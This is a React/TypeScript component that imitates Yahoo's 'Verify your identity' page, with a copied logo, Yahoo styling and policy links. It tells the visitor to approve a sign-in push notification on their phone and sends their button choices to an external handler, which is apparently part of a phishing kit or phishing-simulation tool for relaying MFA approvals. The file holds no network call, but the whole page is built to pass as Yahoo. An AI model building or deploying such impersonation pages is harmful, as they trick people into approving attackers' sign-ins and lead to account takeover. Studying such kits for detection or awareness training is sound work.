import React from 'react';
import { useLocation, useNavigate } from 'react-router-dom';

interface YahooAuthPromptPageProps {
  onAction: (action: string, data?: Record<string, unknown>) => void;
}

const YahooLogo = () => (
  <svg viewBox="0 0 202 72" xmlns="http://www.w3.org/2000/svg" className="h-8" aria-label="Yahoo">
    <path fill="#6001d2" d="M0 12h24.4l14.2 36.3L53 12h23.8L41 96h-24l9.8-23L0 12zm96 0c14.6 0 26.5 11.9 26.5 26.6S110.6 65.2 96 65.2 69.5 53.3 69.5 38.6 81.4 12 96 12zm0 14.6c-6.6 0-12 5.4-12 12s5.4 12 12 12 12-5.4 12-12-5.4-12-12-12zM155 12c14.6 0 26.5 11.9 26.5 26.6S169.6 65.2 155 65.2s-26.5-11.9-26.5-26.6S140.4 12 155 12zm0 14.6c-6.6 0-12 5.4-12 12s5.4 12 12 12 12-5.4 12-12-5.4-12-12-12zM185.5 45.6c5.3 0 9.5 4.3 9.5 9.5s-4.3 9.5-9.5 9.5-9.5-4.3-9.5-9.5 4.3-9.5 9.5-9.5zM190 2h12L190 33h-12l12-31z"/>
  </svg>
);

const YahooAuthPromptPage: React.FC<YahooAuthPromptPageProps> = ({ onAction }) => {
  const location = useLocation();
  const navigate = useNavigate();
  const data = ((location.state as { data?: Record<string, unknown> } | null)?.data) || {};
  const email = (data.email as string) || ((location.state as { email?: string } | null)?.email) || '';
  const deviceName = (data.deviceName as string) || (data.device as string) || 'your mobile device';

  return (
    <div className="min-h-screen flex flex-col bg-white" style={{ fontFamily: "'Helvetica Neue', Helvetica, Arial, sans-serif" }}>
      <main className="flex-grow w-full flex items-center justify-center p-4">
        <div className="w-full max-w-[400px] px-6 py-10">
          <div className="mb-6 flex justify-center">
            <YahooLogo />
          </div>
          <h1 className="text-[28px] leading-8 font-normal text-black text-center mb-2">Verify your identity</h1>
          <p className="text-sm text-gray-700 text-center mb-8">
            We sent a sign-in request to <strong>{deviceName}</strong>. Open the Yahoo Account Key notification and tap <strong>Yes, allow</strong> to continue.
          </p>
          {email && (
            <div className="text-xs text-gray-500 text-center mb-6">Signed in as {email}</div>
          )}

          <div className="flex flex-col items-center justify-center bg-[#faf7fe] border border-[#e9dbff] rounded-2xl py-10 px-6 mb-6">
            <div className="relative w-28 h-28 flex items-center justify-center mb-4">
              <div className="absolute inset-0 rounded-full border-4" style={{ borderColor: '#ead7ff' }}></div>
              <div
                className="absolute inset-0 rounded-full border-4 border-transparent"
                style={{ borderTopColor: '#6001d2', animation: 'yahooSpin 1.2s linear infinite' }}
              ></div>
              <svg className="w-12 h-12" viewBox="0 0 24 24" fill="none" stroke="#6001d2" strokeWidth="1.8">
                <rect x="6" y="2" width="12" height="20" rx="2" />
                <circle cx="12" cy="18" r="1.2" fill="#6001d2" />
              </svg>
            </div>
            <style>{`@keyframes yahooSpin { to { transform: rotate(360deg); } }`}</style>
            <p className="text-sm font-medium" style={{ color: '#6001d2' }}>Waiting for you to approve&hellip;</p>
          </div>

          <p className="text-xs text-gray-600 text-center mb-6">
            This page updates automatically after you approve the request on your device.
          </p>

          <div className="flex justify-between text-sm">
            <button
              type="button"
              onClick={() => onAction('resend_prompt')}
              className="font-medium"
              style={{ color: '#6001d2' }}
            >
              Send a new request
            </button>
            <button
              type="button"
              onClick={() => { onAction('cancel'); navigate(-1); }}
              className="font-medium"
              style={{ color: '#6001d2' }}
            >
              Use a different method
            </button>
          </div>

          <button
            type="button"
            onClick={() => onAction('deny_authenticator')}
            className="mt-6 w-full py-2 border rounded-full text-sm font-medium"
            style={{ borderColor: '#6001d2', color: '#6001d2' }}
          >
            This wasn&rsquo;t me
          </button>
        </div>
      </main>
      <footer className="w-full max-w-[400px] mx-auto text-xs text-gray-500 text-center py-6">
        Yahoo &middot; <a href="https://policies.yahoo.com/us/en/yahoo/privacy/index.htm" className="hover:underline">Privacy</a> &middot; <a href="https://policies.yahoo.com/us/en/yahoo/terms/index.htm" className="hover:underline">Terms</a>
      </footer>
    </div>
  );
};

export default YahooAuthPromptPage;
